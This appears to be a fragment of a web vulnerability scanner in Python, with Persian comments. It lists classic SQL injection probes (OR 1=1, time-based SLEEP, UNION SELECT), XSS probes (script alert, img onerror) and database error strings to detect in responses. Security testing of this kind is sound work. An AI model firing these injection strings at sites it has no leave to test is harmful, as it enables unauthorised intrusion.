# Payloadsهای معروف برای تست SQL Injection
SQLI_PAYLOADS = [
  "'",
  "\"",
  "' OR '1'='1",
  "' OR 1=1 --",
  "1' AND SLEEP(5) --",       # تست کور بر اساس زمان
  "1 UNION SELECT NULL --",
]

# Payloadsهای معروف برای تست XSS
XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  "\"><script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "javascript:alert(1)",
]

# نشانه‌های خطای SQL که در پاسخ سرور جستجو می‌کنیم
SQL_ERROR_SIGNATURES = [
  "SQL syntax",
  "mysql_fetch",
  "ORA-",
  "Microsoft OLE DB Provider for SQL Server",
  "ODBC SQL Server Driver",
  "PostgreSQL",
  "SQLite",
  "unclosed quotation mark",
  "quoted string not properly terminated",
]